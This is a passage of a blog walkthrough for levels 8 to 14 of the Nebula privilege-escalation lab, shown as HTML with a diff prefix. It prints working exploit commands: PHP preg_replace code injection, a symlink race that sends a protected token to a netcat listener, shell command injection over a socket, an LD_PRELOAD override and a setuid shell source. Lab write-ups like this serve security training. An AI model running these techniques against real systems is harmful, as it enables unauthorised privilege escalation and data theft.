+capture.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I copied the pcap off the box and opened it on my Kali Linux VM with wireshark to investigate:&lt;/p&gt;
+
+&lt;p&gt;{% img &lt;a href=&#34;https://i.imgur.com/Xc6IIbX.png&#34;&gt;https://i.imgur.com/Xc6IIbX.png&lt;/a&gt; %}&lt;/p&gt;
+
+&lt;p&gt;Here we can see some data that got captured in clear text. It looks like a telnet session where someone was logging in with the &lt;code&gt;level8&lt;/code&gt; account. The password though has a few dots in it. To make more sense of these, I switched the stream view to hex so that we can try see the ASCII codes of the keypresses.&lt;/p&gt;
+
+&lt;p&gt;{% img &lt;a href=&#34;https://i.imgur.com/CWAERLv.png&#34;&gt;https://i.imgur.com/CWAERLv.png&lt;/a&gt; %}&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;F7&lt;/code&gt; according to the ASCII table is a backspace. That makes this easy :) Considering we have the password &lt;code&gt;backdoor...00Rm8.ate&lt;/code&gt;, substituting the dot with backspaces we end up with &lt;code&gt;backd00Rmate&lt;/code&gt; as the password.&lt;/p&gt;
+
+&lt;p&gt;So, to solve level08:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level08@nebula:/home/flag08$ su - flag08
+Password:
+
+flag08@nebula:~$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level09:0683a5d670a26d450d97365e52610fb5&#34;&gt;level09&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level09/&#34;&gt;Level09&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+There’s a C setuid wrapper for some vulnerable PHP code…
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;With the description we are provided with the source code of a small PHP program:&lt;/p&gt;
+
+&lt;p&gt;```php level9.php
+&amp;lt;?php&lt;/p&gt;
+
+&lt;p&gt;function spam($email)
+{
+  $email = preg_replace(&amp;ldquo;/./&amp;ldquo;, &amp;rdquo; dot &amp;ldquo;, $email);
+  $email = preg_replace(&amp;ldquo;/@/&amp;rdquo;, &amp;ldquo; AT &amp;ldquo;, $email);&lt;/p&gt;
+
+&lt;p&gt;return $email;
+}&lt;/p&gt;
+
+&lt;p&gt;function markup($filename, $use_me)
+{
+  $contents = file_get_contents($filename);&lt;/p&gt;
+
+&lt;p&gt;$contents = preg_replace(&amp;ldquo;/([email (.*)])/e&amp;rdquo;, &amp;ldquo;spam(\&amp;rdquo;\2\&amp;ldquo;)&amp;rdquo;, $contents);
+  $contents = preg_replace(&amp;ldquo;/[/&amp;ldquo;, &amp;ldquo;&amp;lt;&amp;ldquo;, $contents);
+  $contents = preg_replace(&amp;ldquo;/]/&amp;ldquo;, &amp;ldquo;&amp;gt;&amp;rdquo;, $contents);&lt;/p&gt;
+
+&lt;p&gt;return $contents;
+}&lt;/p&gt;
+
+&lt;p&gt;$output = markup($argv[1], $argv[2]);&lt;/p&gt;
+
+&lt;p&gt;print $output;&lt;/p&gt;
+
+&lt;p&gt;?&amp;gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+In the `flag09` directory, we have the above PHP sample as well as a SUID binary.
+
+```bash
+level09@nebula:~$ cd ~flag09
+level09@nebula:/home/flag09$ ls -lh
+total 8.0K
+-rwsr-x--- 1 flag09 level09 7.1K 2011-11-20 21:22 flag09
+-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;At first I managed to solve this one really fast. When &lt;code&gt;flag09&lt;/code&gt; is invoked with &lt;code&gt;-h&lt;/code&gt;, it seemed like it passed the arguments directly to a PHP binary. So, I was able to drop into an interactive PHP shell and execute commands from there:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level09@nebula:/home/flag09$ ./flag09 -a
+Interactive shell
+
+php &amp;gt; system(&amp;quot;id&amp;quot;);
+uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With this I would have been able to prepare the small &lt;code&gt;flag09&lt;/code&gt; setuid shell and complete the level. However, I did not think this was the intended route so I continued to investigate the PHP program further.&lt;/p&gt;
+
+&lt;p&gt;The PHP code basically had 2 main functions. &lt;code&gt;markup()&lt;/code&gt; and &lt;code&gt;spam()&lt;/code&gt;. &lt;code&gt;markup()&lt;/code&gt; would read the contents of a file (who’s location is read as the first command line argument), and using regex, search for a pattern matching &lt;code&gt;[email addr]&lt;/code&gt; where &lt;em&gt;addr&lt;/em&gt; will be the extracted part. It then as a callback executes &lt;code&gt;spam()&lt;/code&gt; which will convert &lt;code&gt;.&lt;/code&gt; to &lt;code&gt;dot&lt;/code&gt; and &lt;code&gt;@&lt;/code&gt; to &lt;code&gt;AT&lt;/code&gt;. I took a really long time researching the &lt;code&gt;preg_replace()&lt;/code&gt; functions and potential exploits with it. Eventually I came across a post describing how code injection may be possible when &lt;code&gt;preg_replace()&lt;/code&gt; is called with the &lt;code&gt;e&lt;/code&gt; modifier. &lt;a href=&#34;http://www.madirish.net/402&#34;&gt;This&lt;/a&gt; blogpost explains the vulnerability in pretty great detail. That blogpost coupled with the PHP docs &lt;a href=&#34;http://php.net/manual/en/reference.pcre.pattern.modifiers.php&#34;&gt;here&lt;/a&gt; helps develop a payload for exploitation. The PHP documentation has a sample of &lt;code&gt;&amp;lt;h1&amp;gt;{${eval($_GET[php_code])}}&amp;lt;/h1&amp;gt;&lt;/code&gt; which is what I used to finish the final payload for this level.&lt;/p&gt;
+
+&lt;p&gt;Another thing to note about the PHP code is the &lt;code&gt;$use_me&lt;/code&gt; variable passed to the &lt;code&gt;markup()&lt;/code&gt; function. It only gets declared and never gets used later. I think the developer of this level wanted this to be a form of hint, but it was handy to get code execution as argument 2 on the command line will be the command we want to execute :)&lt;/p&gt;
+
+&lt;p&gt;So, to solve level09:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level09@nebula:/home/flag09$ echo -ne &amp;quot;[email {\${system(\$use_me)}}]&amp;quot; &amp;gt; /var/tmp/flag09.txt
+
+level09@nebula:/home/flag09$ cat /var/tmp/flag09.txt
+[email {${system($use_me)}}]
+
+level09@nebula:/home/flag09$ ./flag09 /var/tmp/flag09.txt &amp;quot;gcc /var/tmp/shell.c -o /var/tmp/flag09; chmod 4777 /var/tmp/flag09&amp;quot;
+PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1
+
+level09@nebula:/home/flag09$ /var/tmp/flag09
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;intermission:0683a5d670a26d450d97365e52610fb5&#34;&gt;intermission&lt;/h3&gt;
+
+&lt;p&gt;From here, the levels became noticeably harder for me. A lot of the levels had me researching new things that I was unsure of. :)&lt;/p&gt;
+
+&lt;p&gt;I wont detail all of the failed attempts. There were so many. Only the successes (and if a failure was significant) will land here :P
+Lets get to them!&lt;/p&gt;
+
+&lt;h2 id=&#34;level10:0683a5d670a26d450d97365e52610fb5&#34;&gt;level10&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level10/&#34;&gt;Level10&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;With the description we are provided with the source code of a small PHP program:&lt;/p&gt;
+
+&lt;p&gt;```c basic.c
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;string.h&gt;&lt;/p&gt;
+
+&lt;p&gt;int main(int argc, char **argv)
+{
+  char *file;
+  char *host;&lt;/p&gt;
+
+&lt;p&gt;if(argc &amp;lt; 3) {
+      printf(&amp;ldquo;%s file host\n\tsends file to host if you have access to it\n&amp;rdquo;, argv[0]);
+      exit(1);
+  }&lt;/p&gt;
+
+&lt;p&gt;file = argv[1];
+  host = argv[2];&lt;/p&gt;
+
+&lt;p&gt;if(access(argv[1], R_OK) == 0) {
+      int fd;
+      int ffd;
+      int rc;
+      struct sockaddr_in sin;
+      char buffer[4096];&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;  printf(&amp;quot;Connecting to %s:18211 .. &amp;quot;, host); fflush(stdout);
+
+  fd = socket(AF_INET, SOCK_STREAM, 0);
+
+  memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
+  sin.sin_family = AF_INET;
+  sin.sin_addr.s_addr = inet_addr(host);
+  sin.sin_port = htons(18211);
+
+  if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
+      printf(&amp;quot;Unable to connect to host %s\n&amp;quot;, host);
+      exit(EXIT_FAILURE);
+  }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;#define HITHERE &amp;ldquo;.oO Oo.\n&amp;rdquo;
+      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
+          printf(&amp;ldquo;Unable to write banner to host %s\n&amp;rdquo;, host);
+          exit(EXIT_FAILURE);
+      }
+#undef HITHERE&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;  printf(&amp;quot;Connected!\nSending file .. &amp;quot;); fflush(stdout);
+
+  ffd = open(file, O_RDONLY);
+  if(ffd == -1) {
+      printf(&amp;quot;Damn. Unable to open file\n&amp;quot;);
+      exit(EXIT_FAILURE);
+  }
+
+  rc = read(ffd, buffer, sizeof(buffer));
+  if(rc == -1) {
+      printf(&amp;quot;Unable to read from file: %s\n&amp;quot;, strerror(errno));
+      exit(EXIT_FAILURE);
+  }
+
+  write(fd, buffer, rc);
+
+  printf(&amp;quot;wrote file!\n&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;} else {
+      printf(&amp;ldquo;You don&amp;rsquo;t have access to %s\n&amp;rdquo;, file);
+  }
+}&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+As the description has it, this program seems to read a file and send its contents to a user specified IP address on tcp/18211. I tested this by opening a netcat listener with `nc -lk 18211` and sending myself a file to see what comes out. Obviously, I was not able to send the token that was in the same directory as the `flag10` binary as I did not have read access to this.
+
+The problem with this program through is the fact that it checks if the file can be read using `access()`, then only later opens it using `open()`. Using this method it may be possible to change out the file before it hits the `open()` method. Symlinks are the goto for this kind of problem as they can be easily swapped out by relinking a file as the program runs. It of course helps that the file to read can be user specified. There is actually an acronym for this kind of bug called [TOCTTOU](http://en.wikipedia.org/wiki/Time_of_check_to_time_of_use). The Wikipedia article describes almost exactly the same scenario as we have here.
+
+My plan of attack was to create a race condition. I would create an infinite loop that relinks a file from something I can actually read back to the token file and vice versa. While this continuous relinking occurs, I would run the affected binary, hoping that we would catch a case where the link swaps out as hoped for sending the token contents to my netcat listener. To increase my chances of the race condition occurring, I put the `flag10` binary in its own loop as well.
+
+So, to solve level10:
+
+```bash
+level10@nebula:/home/flag10$ while true; do ln -sf /var/tmp/shell.c /var/tmp/flag10-token; ln -sf /home/flag10/token /var/tmp/flag10-token; done &amp;amp;
+[1] 14219
+
+# the counties symlink swap is now happening between /var/tmp/shell.c which I can read and /home/flag10/token which I cant.
+
+level10@nebula:/home/flag10$ while true; do ./flag10 /var/tmp/flag10-token 192.168.217.1; done
+You don&#39;t have access to /var/tmp/flag10-token
+You don&#39;t have access to /var/tmp/flag10-token
+Connecting to 192.168.217.1:18211 .. Connected!
+Sending file .. wrote file!
+Connecting to 192.168.217.1:18211 .. Connected!
+Sending file .. wrote file!
+Connecting to 192.168.217.1:18211 .. Connected!
+Sending file .. wrote file!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On my netcat listener I now had:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ » nc -lk 18211
+.oO Oo.
+#include&amp;lt;stdio.h&amp;gt;
+
+int main(void) {
+    setresuid(geteuid(), geteuid(), geteuid());
+    system(&amp;quot;/bin/sh&amp;quot;);
+    return 0;
+}
+
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With the token file read, we end the level:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level10@nebula:/home/flag10$ su - flag10
+Password:
+flag10@nebula:~$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level11:0683a5d670a26d450d97365e52610fb5&#34;&gt;level11&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level11/&#34;&gt;Level11&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;With the description we are provided with the source code of a small PHP program:&lt;/p&gt;
+
+&lt;p&gt;```c level11.c
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/mman.h&gt;&lt;/p&gt;
+
+&lt;p&gt;/*
+ * Return a random, non predictable file, and return the file descriptor for it.
+ */&lt;/p&gt;
+
+&lt;p&gt;int getrand(char **path)
+{
+  char *tmp;
+  int pid;
+  int fd;&lt;/p&gt;
+
+&lt;p&gt;srandom(time(NULL));&lt;/p&gt;
+
+&lt;p&gt;tmp = getenv(&amp;ldquo;TEMP&amp;rdquo;);
+  pid = getpid();&lt;/p&gt;
+
+&lt;p&gt;asprintf(path, &amp;ldquo;%s/%d.%c%c%c%c%c%c&amp;rdquo;, tmp, pid,
+      &amp;lsquo;A&amp;rsquo; + (random() % 26), &amp;lsquo;0&amp;rsquo; + (random() % 10),
+      &amp;lsquo;a&amp;rsquo; + (random() % 26), &amp;lsquo;A&amp;rsquo; + (random() % 26),
+      &amp;lsquo;0&amp;rsquo; + (random() % 10), &amp;lsquo;a&amp;rsquo; + (random() % 26));&lt;/p&gt;
+
+&lt;p&gt;fd = open(*path, O_CREAT|O_RDWR, 0600);
+  unlink(*path);
+  return fd;
+}&lt;/p&gt;
+
+&lt;p&gt;void process(char *buffer, int length)
+{
+  unsigned int key;
+  int i;&lt;/p&gt;
+
+&lt;p&gt;key = length &amp;amp; 0xff;&lt;/p&gt;
+
+&lt;p&gt;for(i = 0; i &amp;lt; length; i++) {
+      buffer[i] ^= key;
+      key -= buffer[i];
+  }&lt;/p&gt;
+
+&lt;p&gt;system(buffer);
+}&lt;/p&gt;
+
+&lt;p&gt;#define CL &amp;ldquo;Content-Length: &amp;ldquo;&lt;/p&gt;
+
+&lt;p&gt;int main(int argc, char **argv)
+{
+  char line[256];
+  char buf[1024];
+  char *mem;
+  int length;
+  int fd;
+  char *path;&lt;/p&gt;
+
+&lt;p&gt;if(fgets(line, sizeof(line), stdin) == NULL) {
+      errx(1, &amp;ldquo;reading from stdin&amp;rdquo;);
+  }&lt;/p&gt;
+
+&lt;p&gt;if(strncmp(line, CL, strlen(CL)) != 0) {
+      errx(1, &amp;ldquo;invalid header&amp;rdquo;);
+  }&lt;/p&gt;
+
+&lt;p&gt;length = atoi(line + strlen(CL));&lt;/p&gt;
+
+&lt;p&gt;if(length &amp;lt; sizeof(buf)) {
+      if(fread(buf, length, 1, stdin) != length) {
+          err(1, &amp;ldquo;fread length&amp;rdquo;);
+      }
+      process(buf, length);
+  } else {
+      int blue = length;
+      int pink;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;  fd = getrand(&amp;amp;path);
+
+  while(blue &amp;gt; 0) {
+      printf(&amp;quot;blue = %d, length = %d, &amp;quot;, blue, length);
+
+      pink = fread(buf, 1, sizeof(buf), stdin);
+      printf(&amp;quot;pink = %d\n&amp;quot;, pink);
+
+      if(pink &amp;lt;= 0) {
+          err(1, &amp;quot;fread fail(blue = %d, length = %d)&amp;quot;, blue, length);
+      }
+      write(fd, buf, pink);
+
+      blue -= pink;
+  }
+
+  mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
+  if(mem == MAP_FAILED) {
+      err(1, &amp;quot;mmap&amp;quot;);
+  }
+  process(mem, length);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;}&lt;/p&gt;
+
+&lt;p&gt;}&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+I&#39;ll admit. This level kicked my ass. Eventually I gave up and resorted to a few hints that could tell me how to proceed. None of the other walkthroughs that I read actually had working exploits for this level either. That which I have tried never got me to even execute `getflag` so that it would be happy with the effective user ids. Maybe this level is bugged, but I am not sure :(
+
+## level12
+
+[Level12&#39;s Description](https://exploit-exercises.com/nebula/level12/):
+{% blockquote %}
+There is a backdoor process listening on port 50001.
+{% endblockquote %}
+
+With the description we are provided with the source code of a small Lua program:
+
+```lua level12.lua
+local socket = require(&amp;quot;socket&amp;quot;)
+local server = assert(socket.bind(&amp;quot;127.0.0.1&amp;quot;, 50001))
+
+function hash(password)
+  prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)
+  data = prog:read(&amp;quot;*all&amp;quot;)
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+
+
+while 1 do
+  local client = server:accept()
+  client:send(&amp;quot;Password: &amp;quot;)
+  client:settimeout(60)
+  local line, err = client:receive()
+  if not err then
+      print(&amp;quot;trying &amp;quot; .. line) -- log from where ;\
+      local h = hash(line)
+
+      if h ~= &amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot; then
+          client:send(&amp;quot;Better luck next time\n&amp;quot;);
+      else
+          client:send(&amp;quot;Congrats, your token is 413**CARRIER LOST**\n&amp;quot;)
+      end
+
+  end
+
+  client:close()
+end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This level had another very obvious command injection vulnerability on the line where a &lt;code&gt;password&lt;/code&gt; variable is piped through &lt;code&gt;sha1sum&lt;/code&gt;. I made a copy of this program and modified it to print me the outputs so that I could prepare a properly formatted command to be used on a socket. The basic idea of the injection was to separate the echo with a &lt;code&gt;;&lt;/code&gt; character and compile my setuid C shell. I then added a hash (#) to ignore the rest of the command what would have been executed.&lt;/p&gt;
+
+&lt;p&gt;So, to solve level12:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level12@nebula:~$ echo &amp;quot;;gcc /var/tmp/shell.c -o /var/tmp/flag12;chmod 4777 /var/tmp/flag12;#&amp;quot; | nc 127.0.0.1 50001
+Password: Better luck next time
+
+level12@nebula:~$ /var/tmp/flag12
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+sh-4.2$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level13:0683a5d670a26d450d97365e52610fb5&#34;&gt;level13&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level13/&#34;&gt;Level13&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;
+
+&lt;p&gt;```lua level13_safe.c
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;string.h&gt;&lt;/p&gt;
+
+&lt;p&gt;#define FAKEUID 1000&lt;/p&gt;
+
+&lt;p&gt;int main(int argc, char **argv, char **envp)
+{
+  int c;
+  char token[256];&lt;/p&gt;
+
+&lt;p&gt;if(getuid() != FAKEUID) {
+      printf(&amp;ldquo;Security failure detected. UID %d started us, we expect %d\n&amp;rdquo;, getuid(), FAKEUID);
+      printf(&amp;ldquo;The system administrators will be notified of this violation\n&amp;rdquo;);
+      exit(EXIT_FAILURE);
+  }&lt;/p&gt;
+
+&lt;p&gt;// snip, sorry :)&lt;/p&gt;
+
+&lt;p&gt;printf(&amp;ldquo;your token is %s\n&amp;rdquo;, token);&lt;/p&gt;
+
+&lt;p&gt;}&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+This level had me researching for quite some time. I came to learn of ELF DSO&#39;s and `LD_PRELOAD`. Basically, it is possible to have the dynamic linker preload shared libraries from the `LD_PRELOAD` environment variable that may allow for some functions to be modified. [This](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) article contained most of the magic that was needed to get this level done.
+
+I decided to &#39;override&#39; the `getuid()` function so that it would return the value of the `FAKEUID` constant in the program, instead of the value the real `getuid()` would have returned. For that to happen, I looked up the arguments for `getuid()` from the man page and copied that for my own purposes. I then compiled it as a shared library with the famous `-shared -fPIC` arguments for position independent code and exported the `LD_PRELOAD` variable prior to running the binary.
+
+One important thing to note here is that this &#39;hack&#39; has a few gotchas. The executing binary and the library needs to be relative to each other. SETUID programs discard the `LD_PRELOAD` environment variable (for obvious reasons) so this is not a privilege escalation. In the source code we have received, there is a portion excluded (that probably just prints the token :P) on purpose. This means we can copy the binary and still be able to get the desired effect. Of course, we could also resort to slapping this into a debugger and checking what it is doing under the hood, but given the nature of Nebula, I figured the point is to actually override `getuid()`.
+
+So, to solve level13:
+
+```bash
+level13@nebula:/var/tmp$ cp ~flag13/flag13 .
+
+level13@nebula:/var/tmp$ cat fake_getuid.c
+#include&amp;lt;unistd.h&amp;gt;
+
+uid_t getuid(void) {
+    return 1000;
+}
+
+level13@nebula:/var/tmp$ gcc -shared -fPIC /var/tmp/fake_getuid.c -o /var/tmp/fake_getuid.o
+
+level13@nebula:/var/tmp$ LD_PRELOAD=/var/tmp/fake_getuid.o ./flag13
+your token is b705702b-76a8-42b0-8844-3adabbe5ac58
+
+level13@nebula:/var/tmp$ su - flag13
+Password:
+flag13@nebula:~$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level14:0683a5d670a26d450d97365e52610fb5&#34;&gt;level14&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level14/&#34;&gt;Level14&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;Logged in as user &lt;code&gt;level14&lt;/code&gt;, we see 2 files in the &lt;code&gt;flag14&lt;/code&gt; directory:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level14@nebula:~$ cd ~flag14
+level14@nebula:/home/flag14$ ls -lh
+total 8.0K
+-rwsr-x--- 1 flag14  level14 7.2K 2011-12-05 18:59 flag14
+-rw------- 1 level14 level14   37 2011-12-05 18:59 token
+
+level14@nebula:/home/flag14$ cat token
+857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;token&lt;/code&gt; obviously being the target to decrypt. Running &lt;code&gt;flag14&lt;/code&gt; tells us that it is expecting a &lt;code&gt;-e&lt;/code&gt; flag to encrypt. So, I tested the encryption to see how it behaves:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level14@nebula:/home/flag14$ ./flag14 -e
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;What immediately jumped out at me was the A&amp;rsquo;s that I had sent it came back as the alphabet. :D After a few tests I came to the conclusion that the key seems to start at 0, and increments with every character. Each characters ASCII value is then incremented by what ever the current value of the key is. To test this theory, I wrote a small python script to replicate this behavior:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python
+
+# exploit-exercises level14 cryptor
+
+string = &#39;AABBCCDDEEFFGG&#39;
+key = 0
+result = &#39;&#39;
+
+print &#39;String: {s}\nStrlen: {l}\t&#39;.format(s = string, l = len(string))
+
+for char in string:
+    print &#39;Key: {key}\t Char: {char}\t Ord: {ord}\t Res: {res}&#39;.format(
+        key = key, char = char, ord = ord(char), res = chr(ord(char) + key)
+    )
+    result += chr(ord(char) + key)
+    key += 1
+
+print &#39;\nResult: {res}&#39;.format(res = result)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Running this meant that the output would be:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;~ # python crypt.py
+String: AABBCCDDEEFFGG
+Strlen: 14
+Key: 0   Char: A     Ord: 65     Res: A
+Key: 1   Char: A     Ord: 65     Res: B
+Key: 2   Char: B     Ord: 66     Res: D
+Key: 3   Char: B     Ord: 66     Res: E
+Key: 4   Char: C     Ord: 67     Res: G
+Key: 5   Char: C     Ord: 67     Res: H
+Key: 6   Char: D     Ord: 68     Res: J
+Key: 7   Char: D     Ord: 68     Res: K
+Key: 8   Char: E     Ord: 69     Res: M
+Key: 9   Char: E     Ord: 69     Res: N
+Key: 10  Char: F     Ord: 70     Res: P
+Key: 11  Char: F     Ord: 70     Res: Q
+Key: 12  Char: G     Ord: 71     Res: S
+Key: 13  Char: G     Ord: 71     Res: T
+
+Result: ABDEGHJKMNPQST
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The same string was checked using the &lt;code&gt;flag14&lt;/code&gt; cryptor:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level14@nebula:/home/flag14$ ./flag14 -e
+AABBCCDDEEFFGG
+ABDEGHJKMNPQST
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A match :) Being able to replicate the encryption, meant that the decryption was trivial. Instead of adding 1 to the key, I simply subtracted 1 from the key in order to reverse the string in the &lt;code&gt;token&lt;/code&gt; file:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;~ # python decrypt.py
+String: 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
+Strlen: 36  Key start = 0
+Key: 0   Char: 8     Ord: 56     Res: 8
+Key: 1   Char: 5     Ord: 53     Res: 4
+Key: 2   Char: 7     Ord: 55     Res: 5
+Key: 3   Char: :     Ord: 58     Res: 7
+Key: 4   Char: g     Ord: 103    Res: c
+Key: 5   Char: 6     Ord: 54     Res: 1
+Key: 6   Char: 7     Ord: 55     Res: 1
+Key: 7   Char: ?     Ord: 63     Res: 8
+Key: 8   Char: 5     Ord: 53     Res: -
+Key: 9   Char: A     Ord: 65     Res: 8
+Key: 10  Char: B     Ord: 66     Res: 8
+Key: 11  Char: B     Ord: 66     Res: 7
+Key: 12  Char: o     Ord: 111    Res: c
+Key: 13  Char: :     Ord: 58     Res: -
+Key: 14  Char: B     Ord: 66     Res: 4
+Key: 15  Char: t     Ord: 116    Res: e
+Key: 16  Char: D     Ord: 68     Res: 4
+Key: 17  Char: A     Ord: 65     Res: 0
+Key: 18  Char: ?     Ord: 63     Res: -
+Key: 19  Char: t     Ord: 116    Res: a
+Key: 20  Char: I     Ord: 73     Res: 5
+Key: 21  Char: v     Ord: 118    Res: a
+Key: 22  Char: L     Ord: 76     Res: 6
+Key: 23  Char: D     Ord: 68     Res: -
+Key: 24  Char: K     Ord: 75     Res: 3
+Key: 25  Char: L     Ord: 76     Res: 3
+Key: 26  Char: {     Ord: 123    Res: a
+Key: 27  Char: M     Ord: 77     Res: 2
+Key: 28  Char: Q     Ord: 81     Res: 5
+Key: 29  Char: P     Ord: 80     Res: 3
+Key: 30  Char: S     Ord: 83     Res: 5
+Key: 31  Char: R     Ord: 82     Res: 3
+Key: 32  Char: Q     Ord: 81     Res: 1
+Key: 33  Char: W     Ord: 87     Res: 6
+Key: 34  Char: W     Ord: 87     Res: 5
+Key: 35  Char: .     Ord: 46     Res:
+
+
+Result: 8457c118-887c-4e40-a5a6-33a25353165
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So, to solve level14:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level14@nebula:/home/flag14$ su - flag14
+Password:
+flag14@nebula:~$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level15:0683a5d670a26d450d97365e52610fb5&#34;&gt;level15&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level15/&#34;&gt;Level15&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
